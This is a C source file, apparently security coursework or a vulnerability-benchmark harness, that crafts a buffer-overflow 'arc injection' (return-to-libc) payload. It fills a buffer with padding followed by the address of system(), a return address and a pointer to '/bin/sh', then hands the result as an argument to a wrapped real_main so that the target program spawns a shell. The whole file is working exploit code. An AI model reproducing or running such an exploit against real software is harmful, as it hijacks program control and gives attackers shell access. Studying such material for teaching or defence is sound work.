
#include "stdio.h"
#include "stdlib.h"
#include "string.h"

#define DEBUG 1
#define FORMATBUFFERSIZE 2048

union
{
    unsigned long int integer;
    unsigned char byte[4];
} intUnion;

union
{
    unsigned short int shortinteger;
    unsigned char byte[2];
} shortUnion;

extern int real_main(int argc, char **argv);

int main(int argc, char **argv) {

	char taintedbuf[8192] __attribute__ ((aligned (8)));
	int taintedbufWritePtr, taintedbufWriteCnt, diff;
	unsigned long int binshaddr, systemaddr, exitaddr;
	unsigned long int bufferaddr, retfptraddr;
	/**

	if (argc==3) {
		sscanf(argv[1], "%lx", &shellcodeaddr);
		sscanf(argv[2], "%lx", &retfptraddr);
	} else {
		printf("Wrong arguments..");
		return -1;
	}

	**/
	 /* Buffer Overflow - Arc Injection exploit */

	memset(taintedbuf,0,sizeof(taintedbuf));
	taintedbufWritePtr=0;
	taintedbufWriteCnt=0;

	sscanf(argv[1], "%lx", &systemaddr);
	sscanf(argv[2], "%lx", &retfptraddr);
	sscanf(argv[3], "%lx", &bufferaddr);
	// set the environment variable
	char binsh[] = "/bin/sh";
	char tmp[20];
	sprintf(tmp, "%p", (void *) &binsh);
	sscanf(tmp, "%lx", &binshaddr);
	printf("binshaddr=0x%lx, systemaddr=0x%lx, retfptraddr=0x%lx, bufferaddr=0x%lx\n", binshaddr, systemaddr, retfptraddr, bufferaddr);

	int i;
	diff = retfptraddr - bufferaddr - 12; // 4 bytes each for binshaddr, systemaddr and retfptraddr
	char padding[50000];
	// 100 characters of padding
	for(i = 0; i < diff; i++) {
		padding[i] = '-';
	}
	padding[i] = '\0';
	strcat(taintedbuf, padding);
	taintedbufWritePtr = strlen(taintedbuf);

	// function to arc-inject
	intUnion.integer = systemaddr;
	taintedbuf[taintedbufWritePtr+3]=intUnion.byte[3];
	taintedbuf[taintedbufWritePtr+2]=intUnion.byte[2];
	taintedbuf[taintedbufWritePtr+1]=intUnion.byte[1];
	taintedbuf[taintedbufWritePtr]=intUnion.byte[0];
	taintedbufWritePtr+=4;
	// return to this function after our arc is over
	intUnion.integer = retfptraddr;
	taintedbuf[taintedbufWritePtr+3]=intUnion.byte[3];
	taintedbuf[taintedbufWritePtr+2]=intUnion.byte[2];
	taintedbuf[taintedbufWritePtr+1]=intUnion.byte[1];
	taintedbuf[taintedbufWritePtr]=intUnion.byte[0];
	taintedbufWritePtr+=4;

	// argument to arc (system)
	intUnion.integer = binshaddr;
	taintedbuf[taintedbufWritePtr+3]=intUnion.byte[3];
	taintedbuf[taintedbufWritePtr+2]=intUnion.byte[2];
	taintedbuf[taintedbufWritePtr+1]=intUnion.byte[1];
	taintedbuf[taintedbufWritePtr]=intUnion.byte[0];
	taintedbufWritePtr+=4;

	taintedbuf[taintedbufWritePtr] = '\0';


	printf("%s\n", taintedbuf);

	strcpy(argv[1], "-a");
	argv[2] = taintedbuf;
	argc = 3;
	int ret;
	ret = real_main(argc, argv);

	return ret;
}
